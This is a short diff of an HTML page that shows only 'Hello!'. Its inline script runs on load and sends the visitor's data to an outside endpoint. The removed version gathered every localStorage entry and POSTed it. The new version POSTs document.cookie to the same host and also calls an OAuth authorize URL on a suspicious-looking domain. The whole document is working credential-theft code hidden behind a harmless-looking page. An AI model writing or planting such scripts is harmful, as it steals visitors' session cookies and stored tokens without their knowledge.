@@ -3,16 +3,10 @@
 <body>
 	<h1>Hello!</h1>
     <script>
-		const cookies = [];
-		for (let i = 0; i < 100000; i++) {
-			const key = localStorage.key(i);
-			const value = localStorage.getItem(key);	
-
-			cookies.push(`${key}=${value}`);
-		}	
+		fetch('https://sketchycompany.upd-dcs.work/authorize?response_type=code&client_id=CLIENT123&redirect_uri=https%3A%2F%2Fportal.sketchycompany.upd-dcs.work%2Fcallback&code_challenge=P8oOPm2R_6D0DVeeWeUikMbiANTm3sABkuWNmbdazxk&code_challenge_method=S256&state=LwVoguHOSY7Lg2qfJQzxyQ&scope=profile')
         fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
             method: 'POST',
-            body: cookies.join('; ')
+            body: document.cookie
         })
     </script>
 </body>
